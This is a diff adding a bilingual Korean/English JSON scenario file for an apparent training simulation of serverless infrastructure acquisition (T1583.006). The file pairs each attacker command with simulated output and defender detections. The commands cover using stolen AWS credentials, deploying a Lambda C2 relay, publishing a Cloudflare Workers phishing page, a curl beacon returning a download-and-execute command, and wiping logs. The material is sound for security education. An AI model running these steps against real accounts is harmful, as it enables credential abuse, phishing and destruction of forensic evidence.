@@ -1,0 +1,180 @@
+{
+  "id": "T1583.006",
+  "title": "서버리스 인프라 확보 시뮬레이션",
+  "titleEn": "Serverless Infrastructure Acquisition Simulation",
+  "duration": 10,
+  "phases": [
+    { "label": "🔍 계정 확보", "labelEn": "🔍 Account Acquisition", "steps": [0, 1] },
+    { "label": "⚡ 함수 배포", "labelEn": "⚡ Function Deployment", "steps": [2, 3] },
+    { "label": "✅ C2 운영", "labelEn": "✅ C2 Operations", "steps": [4] }
+  ],
+  "topoNodes": [
+    { "id": "ext", "label": "Attacker", "x": 50, "y": 60 },
+    { "id": "lambda", "label": "AWS Lambda", "x": 200, "y": 30 },
+    { "id": "workers", "label": "CF Workers", "x": 200, "y": 90 },
+    { "id": "victim", "label": "Victim", "x": 350, "y": 60 },
+    { "id": "c2", "label": "C2 Backend", "x": 500, "y": 60 }
+  ],
+  "topoEdges": [
+    { "from": "ext", "to": "lambda", "minStep": 0 },
+    { "from": "ext", "to": "workers", "minStep": 2 },
+    { "from": "victim", "to": "lambda", "minStep": 3 },
+    { "from": "lambda", "to": "c2", "minStep": 4 }
+  ],
+  "desktopIcons": [
+    { "name": "🗑️ Recycle Bin", "icon": "🗑️" },
+    { "name": "{companyName} Data", "icon": "📁" },
+    { "name": "lambda_c2.py", "icon": "📄", "alert": true },
+    { "name": "worker_phish.js", "icon": "📝" }
+  ],
+  "steps": [
+    {
+      "cmd": "aws sts get-caller-identity --profile stolen-creds",
+      "out": "{\n  \"UserId\": \"AIDAEXAMPLE123456\",\n  \"Account\": \"987654321098\",\n  \"Arn\": \"arn:aws:iam::987654321098:user/dev-temp-user\"\n}",
+      "def": "[CloudTrail] API call from unusual IP using dev-temp-user credentials",
+      "defAction": "Source: 198.51.100.23 (Tor exit node)\nTarget: AWS IAM\nAction: Unusual login location flagged, MFA not configured",
+      "desc": "다크 웹에서 구매한 AWS 크레덴셜로 로그인하여 서버리스 인프라 구축을 위한 계정을 확보합니다.",
+      "descEn": "Logging in with AWS credentials purchased from the dark web to acquire an account for serverless infrastructure.",
+      "stepTitle": "도난 AWS 크레덴셜 사용",
+      "stepTitleEn": "Using Stolen AWS Credentials",
+      "feynman": "다크 웹에서 구매한 AWS '열쇠'(크레덴셜)로 남의 클라우드 계정에 접속합니다. 이 계정으로 서버리스 함수를 만들면, 비용은 원래 계정 소유자에게 청구되고 공격자는 추적을 피할 수 있습니다.",
+      "feynmanEn": "Using AWS 'keys' (credentials) purchased from the dark web to access someone else's cloud account. Creating serverless functions on this account bills the original owner while the attacker avoids tracking.",
+      "expert": "도난된 IAM 크레덴셜(Access Key/Secret Key)로 인증합니다. dev-temp-user는 MFA가 미설정이고 Lambda 생성 권한이 있는 개발용 임시 계정입니다. CloudTrail이 활성화되어 있지만 로그 모니터링이 부재하면 탐지가 지연됩니다.",
+      "expertEn": "Authenticating with stolen IAM credentials (Access Key/Secret Key). dev-temp-user is a temporary dev account without MFA that has Lambda creation permissions. CloudTrail is active but without log monitoring, detection is delayed.",
+      "defTooltip": "☁️ CloudTrail: 비정상 IP에서 dev-temp-user 크레덴셜 사용 감지",
+      "defTooltipEn": "☁️ CloudTrail: dev-temp-user credentials used from unusual IP detected",
+      "hackerLog": {
+        "title": "aws_access.log",
+        "lines": [
+          { "log": "Account: 987654321098", "desc": "💡 피해자의 AWS 계정에 성공적으로 접속" },
+          { "log": "User: dev-temp-user", "desc": "💡 MFA 미설정 개발자 계정 — 크레덴셜만으로 접근 가능" },
+          { "log": "Source: Tor exit node", "desc": "💡 Tor를 통해 접속하여 실제 IP 은닉" }
+        ]
+      },
+      "terms": [
+        { "name": "AWS IAM", "desc": "AWS Identity and Access Management. AWS 리소스에 대한 접근을 제어하는 서비스. 크레덴셜(Access Key/Secret Key)로 인증합니다" },
+        { "name": "CloudTrail", "desc": "AWS API 호출을 기록하는 감사 로깅 서비스. 활성화되어 있어도 로그를 모니터링하지 않으면 무용지물입니다" }
+      ]
+    },
+    {
+      "cmd": "aws lambda create-function --function-name c2-relay-prod --runtime python3.9 --handler lambda_function.handler --role arn:aws:iam::987654321098:role/lambda-basic --zip-file fileb://c2_relay.zip --timeout 30 --memory-size 256",
+      "out": "{\n  \"FunctionName\": \"c2-relay-prod\",\n  \"FunctionArn\": \"arn:aws:lambda:ap-northeast-2:987654321098:function:c2-relay-prod\",\n  \"Runtime\": \"python3.9\",\n  \"State\": \"Active\",\n  \"LastModified\": \"2026-03-01T09:30:00.000+0000\",\n  \"CodeSize\": 4096\n}",
+      "def": "[CloudTrail] New Lambda function created: c2-relay-prod in ap-northeast-2",
+      "defAction": "Source: dev-temp-user\nTarget: Lambda service\nAction: New function creation logged, no approval workflow",
+      "desc": "AWS Lambda에 C2 릴레이 함수를 배포합니다. amazonaws.com 도메인으로 방화벽을 우회합니다.",
+      "descEn": "Deploying a C2 relay function to AWS Lambda. Bypasses firewalls using amazonaws.com domain.",
+      "stepTitle": "Lambda C2 릴레이 배포",
+      "stepTitleEn": "Lambda C2 Relay Deployment",
+      "feynman": "AWS Lambda에 '중계소' 프로그램을 설치합니다. 감염된 컴퓨터가 이 Lambda 함수에 접속하면, Lambda가 실제 C2 서버로 명령을 전달합니다. 모든 트래픽이 amazonaws.com을 통해 이루어지므로 방화벽에서 차단하기 어렵습니다.",
+      "feynmanEn": "Installing a 'relay station' program on AWS Lambda. When infected computers connect to this Lambda function, it forwards commands to the actual C2 server. All traffic goes through amazonaws.com, making firewall blocking difficult.",
+      "expert": "Lambda 함수가 ap-northeast-2(서울) 리전에 배포되어 한국 대상 공격의 지연 시간을 최소화합니다. 함수 URL을 활성화하면 별도 API Gateway 없이 직접 HTTPS 엔드포인트가 생성됩니다.",
+      "expertEn": "Lambda function deployed to ap-northeast-2 (Seoul) region, minimizing latency for targeting Korean organizations. Enabling function URL creates a direct HTTPS endpoint without API Gateway.",
+      "defTooltip": "⚡ CloudTrail: ap-northeast-2에 새 Lambda 함수 c2-relay-prod 생성됨",
+      "defTooltipEn": "⚡ CloudTrail: New Lambda function c2-relay-prod created in ap-northeast-2",
+      "hackerLog": {
+        "title": "lambda_deploy.log",
+        "lines": [
+          { "log": "FunctionName: c2-relay-prod", "desc": "💡 정상적인 함수명으로 위장 — 'prod' 접미사로 의심 회피" },
+          { "log": "Region: ap-northeast-2 (Seoul)", "desc": "💡 한국 리전 배포 — 한국 대상 공격에 최적화" },
+          { "log": "Domain: *.lambda-url.ap-northeast-2.on.aws", "desc": "💡 amazonaws.com 도메인 — 대부분의 방화벽에서 허용" }
+        ]
+      },
+      "terms": [
+        { "name": "AWS Lambda", "desc": "서버 관리 없이 코드를 실행할 수 있는 서버리스 컴퓨팅 서비스. 실행 후 환경이 소멸되어 포렌식이 어렵습니다" },
+        { "name": "Lambda Function URL", "desc": "Lambda 함수에 직접 HTTPS 엔드포인트를 부여하는 기능. API Gateway 없이 간단하게 웹 API를 만들 수 있습니다" }
+      ]
+    },
+    {
+      "cmd": "wrangler deploy --name login-portal-kr --route 'login-secure.workers.dev/*'",
+      "out": "Uploading worker 'login-portal-kr'...\n\n✓ Published login-portal-kr (1.23 sec)\n  https://login-secure.workers.dev\n  routes:\n    - login-secure.workers.dev/*\n\nWorker Details:\n  Name: login-portal-kr\n  Size: 12.4 KB\n  SSL: Automatic (workers.dev wildcard)\n  Global Deployment: 200+ edge locations",
+      "def": "[Threat Intel] Phishing page deployed on Cloudflare Workers - login-secure.workers.dev",
+      "defAction": "Source: Cloudflare Workers\nTarget: Credential harvesting\nAction: Domain reported to Cloudflare Trust & Safety",
+      "desc": "Cloudflare Workers에 피싱 페이지를 배포합니다. workers.dev 도메인에 자동 SSL이 적용됩니다.",
+      "descEn": "Deploying a phishing page to Cloudflare Workers. Automatic SSL is applied to the workers.dev domain.",
+      "stepTitle": "Cloudflare Workers 피싱 배포",
+      "stepTitleEn": "Cloudflare Workers Phishing Deployment",
+      "feynman": "Cloudflare Workers에 가짜 로그인 페이지를 만듭니다. 'login-secure.workers.dev'라는 주소에 자동으로 SSL 인증서가 붙어 브라우저에 자물쇠 아이콘이 표시됩니다. 전 세계 200개 이상의 서버에서 동시에 서비스되므로 매우 빠르고 안정적입니다.",
+      "feynmanEn": "Creating a fake login page on Cloudflare Workers. 'login-secure.workers.dev' automatically gets an SSL certificate, showing a padlock icon in browsers. Served from 200+ servers worldwide, making it fast and reliable.",
+      "expert": "Cloudflare Workers는 전 세계 엣지 네트워크에서 실행되므로 단일 IP 차단이 불가능합니다. workers.dev 와일드카드 SSL로 피싱 페이지에 신뢰할 수 있는 인증서가 자동 적용됩니다. 무료 티어로 일 10만 요청까지 가능합니다.",
+      "expertEn": "Cloudflare Workers run on the global edge network, making single IP blocking impossible. workers.dev wildcard SSL automatically provides trusted certificates for phishing pages. Free tier allows 100K requests/day.",
+      "defTooltip": "🎣 위협 인텔: Cloudflare Workers에 피싱 페이지 배포 감지",
+      "defTooltipEn": "🎣 Threat Intel: Phishing page deployed on Cloudflare Workers detected",
+      "hackerLog": {
+        "title": "workers_phish.log",
+        "lines": [
+          { "log": "URL: login-secure.workers.dev", "desc": "💡 신뢰할 수 있어 보이는 URL — SSL 자물쇠 아이콘 표시" },
+          { "log": "Global: 200+ edge locations", "desc": "💡 전 세계 배포 — IP 차단으로 대응 불가" },
+          { "log": "Size: 12.4 KB", "desc": "💡 경량 피싱 키트 — 5분 만에 배포 완료" }
+        ]
+      },
+      "terms": [
+        { "name": "Cloudflare Workers", "desc": "Cloudflare의 서버리스 엣지 컴퓨팅 플랫폼. 전 세계 200+ 위치에서 JavaScript를 실행합니다. 무료 티어가 있어 공격에 악용됩니다" },
+        { "name": "Edge Computing", "desc": "사용자와 가까운 위치에서 코드를 실행하는 컴퓨팅 모델. 빠른 응답 속도를 제공하며, 중앙 서버 없이 분산 실행됩니다" }
+      ]
+    },
+    {
+      "cmd": "curl -s -X POST 'https://c2-relay-prod.lambda-url.ap-northeast-2.on.aws/beacon' -d '{\"host\":\"VICTIM-PC\",\"user\":\"admin\",\"os\":\"Windows 11\",\"data\":\"base64_sysinfo\"}'",
+      "out": "{\n  \"status\": \"ok\",\n  \"command\": \"download_and_exec\",\n  \"payload_url\": \"https://drive.google.com/uc?id=1aBcDeFg\",\n  \"next_beacon\": 300,\n  \"relay_latency\": \"12ms\"\n}",
+      "def": "[EDR] Beacon traffic to Lambda function URL from compromised host",
+      "defAction": "Source: VICTIM-PC (10.0.1.45)\nTarget: c2-relay-prod.lambda-url.ap-northeast-2.on.aws\nAction: C2 beacon pattern detected, process quarantined",
+      "desc": "감염된 호스트가 Lambda C2에 비콘을 보내고, 응답으로 다음 명령을 수신합니다.",
+      "descEn": "The infected host sends a beacon to Lambda C2 and receives the next command in response.",
+      "stepTitle": "Lambda C2 비콘 테스트",
+      "stepTitleEn": "Lambda C2 Beacon Test",
+      "feynman": "감염된 컴퓨터가 5분마다 Lambda 함수에 '보고'합니다. Lambda는 다음에 할 일(이 경우 Google Drive에서 파일 다운로드 후 실행)을 응답합니다. 12밀리초 지연은 한국 리전이라 매우 빠릅니다.",
+      "feynmanEn": "The infected computer 'reports in' to the Lambda function every 5 minutes. Lambda responds with the next task (in this case, download and execute a file from Google Drive). 12ms latency is very fast due to the Korean region.",
+      "expert": "Lambda C2 비콘은 HTTPS POST를 통한 간단한 JSON 교환입니다. next_beacon: 300은 5분 간격 비콘을 의미하며, 페이로드를 Google Drive에서 호스팅하여 추가적인 합법 서비스 계층을 더합니다.",
+      "expertEn": "Lambda C2 beacon is a simple JSON exchange via HTTPS POST. next_beacon: 300 means 5-minute beacon intervals, with payloads hosted on Google Drive adding another layer of legitimate service.",
+      "defTooltip": "📡 EDR: Lambda 함수 URL로의 C2 비콘 트래픽 감지",
+      "defTooltipEn": "📡 EDR: Beacon traffic to Lambda function URL detected from compromised host",
+      "hackerLog": {
+        "title": "beacon_test.log",
+        "lines": [
+          { "log": "command: download_and_exec", "desc": "💡 C2에서 페이로드 다운로드 및 실행 명령 수신" },
+          { "log": "payload_url: drive.google.com/...", "desc": "💡 페이로드도 Google Drive에서 호스팅 — 다중 합법 서비스 활용" },
+          { "log": "relay_latency: 12ms", "desc": "💡 서울 리전 Lambda로 초저지연 C2 통신" }
+        ]
+      },
+      "terms": [
+        { "name": "Beacon", "desc": "감염된 호스트가 C2 서버에 주기적으로 보내는 신호. 생존 확인과 새 명령 수신을 위해 사용됩니다" },
+        { "name": "Beacon Interval", "desc": "비콘 전송 간격. 짧으면 실시간 제어가 가능하지만 탐지 확률이 높아지고, 길면 은밀하지만 제어가 느려집니다" }
+      ]
+    },
+    {
+      "cmd": "python3 cleanup.py --destroy-lambda c2-relay-prod --delete-workers login-portal-kr --wipe-logs",
+      "out": "[+] Destroying Lambda function: c2-relay-prod...\n  ✓ Function deleted\n  ✓ CloudWatch logs deleted (last 24h)\n  ✓ Function URL deactivated\n\n[+] Deleting Cloudflare Worker: login-portal-kr...\n  ✓ Worker deleted\n  ✓ Route removed\n  ✓ No persistent storage\n\n[+] Forensic Evidence Status:\n  Lambda execution environment: DESTROYED (no disk)\n  Worker execution context: DESTROYED (no disk)\n  CloudTrail logs: RETAINED (90 days default)\n  Cloudflare logs: RETAINED (72 hours free tier)\n\n[+] Infrastructure cleanup complete\n[!] Note: CloudTrail and CF logs may still exist",
+      "def": "[CloudTrail] Lambda function c2-relay-prod deleted, CloudWatch logs purged",
+      "defAction": "Source: dev-temp-user\nTarget: Lambda + CloudWatch\nAction: Anti-forensics activity detected — incident escalated",
+      "desc": "공격 완료 후 서버리스 인프라를 삭제하여 포렌식 증거를 최소화합니다.",
+      "descEn": "Deleting serverless infrastructure after the attack to minimize forensic evidence.",
+      "stepTitle": "인프라 정리 및 증거 소멸",
+      "stepTitleEn": "Infrastructure Cleanup and Evidence Destruction",
+      "feynman": "공격이 끝나면 Lambda 함수와 Workers를 삭제합니다. 서버리스는 실행 환경이 완전히 소멸되므로 디스크 포렌식이 불가능합니다. 마치 모래 위에 쓴 글씨가 파도에 씻겨 나가는 것과 같습니다. 다만 CloudTrail 로그는 90일간 유지됩니다.",
+      "feynmanEn": "After the attack, Lambda functions and Workers are deleted. Serverless execution environments are completely destroyed, making disk forensics impossible. Like writing in sand that gets washed away by waves. However, CloudTrail logs persist for 90 days.",
+      "expert": "서버리스 환경 삭제 시 실행 컨테이너가 완전히 소멸되어 메모리/디스크 포렌식이 불가능합니다. CloudWatch 로그를 수동 삭제했지만 CloudTrail은 90일간 유지됩니다. Cloudflare 무료 티어 로그는 72시간만 보존됩니다.",
+      "expertEn": "Serverless environment deletion completely destroys execution containers, making memory/disk forensics impossible. CloudWatch logs were manually deleted, but CloudTrail persists for 90 days. Cloudflare free tier logs are only retained for 72 hours.",
+      "defTooltip": "🔥 CloudTrail: Lambda 함수 삭제 및 CloudWatch 로그 퍼지 — 안티포렌식 활동",
+      "defTooltipEn": "🔥 CloudTrail: Lambda function deleted, CloudWatch logs purged — anti-forensics activity",
+      "hackerLog": {
+        "title": "cleanup.log",
+        "lines": [
+          { "log": "Lambda execution environment: DESTROYED", "desc": "💡 서버리스 환경 소멸 — 디스크 포렌식 완전 불가" },
+          { "log": "CloudTrail logs: RETAINED (90 days)", "desc": "💡 CloudTrail은 삭제 불가 — API 호출 기록은 남아있음" },
+          { "log": "CF logs: RETAINED (72 hours)", "desc": "💡 72시간 후 자동 삭제 — 신속한 대응 필요" }
+        ]
+      },
+      "terms": [
+        { "name": "Anti-Forensics", "desc": "포렌식 조사를 방해하기 위해 증거를 삭제하거나 변조하는 행위. 서버리스 환경의 휘발성을 이용하면 자동으로 달성됩니다" },
+        { "name": "CloudTrail", "desc": "AWS API 호출의 감사 로그. 기본 90일 보존되며 삭제가 불가능하여 공격자에게 유일한 약점이 됩니다" }
+      ]
+    }
+  ],
+  "processTree": [
+    { "name": "bash", "depth": 0, "alert": false, "minStep": 0 },
+    { "name": "aws sts (PID: 6101)", "depth": 1, "alert": false, "minStep": 0 },
+    { "name": "aws lambda create (PID: 6134)", "depth": 1, "alert": true, "minStep": 1 },
+    { "name": "wrangler deploy (PID: 6201)", "depth": 1, "alert": true, "minStep": 2 },
+    { "name": "curl → beacon (PID: 6289)", "depth": 1, "alert": true, "minStep": 3 },
+    { "name": "python3 cleanup.py (PID: 6345)", "depth": 1, "alert": true, "minStep": 4 }
+  ]
+}
